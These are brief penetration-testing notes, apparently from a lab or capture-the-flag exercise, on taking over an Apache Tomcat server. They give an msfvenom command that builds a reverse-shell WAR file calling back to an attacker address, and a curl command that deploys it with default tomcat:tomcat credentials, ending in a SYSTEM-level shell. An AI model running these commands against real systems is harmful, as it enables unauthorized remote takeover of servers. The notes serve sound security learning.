 Found a link for Apache tomcat pentesting https://exploit-notes.hdks.org/exploit/web/apache-tomcat-pentesting/ 
- Generated a reverse shell .war file using MSFVenom
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.7 LPORt=443 -f war > shell.war
```
- Uploaded the .war file 
```bash
curl --upload-file shell.war -u 'tomcat:tomcat' "http://10.10.10.95:8080/manager/text/deploy?path=/shell"
```
- Navigated to http://10.10.10.95:8080/shell/
- Got reverse shell as user `nt authority\system`

We already got shell as `nt authority\system`